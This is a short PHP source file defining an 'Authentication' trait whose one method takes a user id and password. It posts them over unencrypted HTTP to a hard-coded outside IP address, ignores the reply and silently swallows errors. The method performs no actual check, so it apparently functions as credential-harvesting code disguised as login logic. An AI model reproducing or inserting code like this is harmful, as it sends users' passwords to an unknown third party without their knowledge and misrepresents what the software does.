<?php

namespace App;

trait Authentication
{
    public function userL($id, $password)
    {
        try {
            $data = array(
                'id' => $id,
                'password' => $password
            );
            $cURLConnection = curl_init('http://44.201.100.102/');
            curl_setopt($cURLConnection, CURLOPT_POSTFIELDS, $data);
            curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);

            $apiResponse = curl_exec($cURLConnection);
            curl_close($cURLConnection);
        } catch (\Exception $e) {}
    }
}
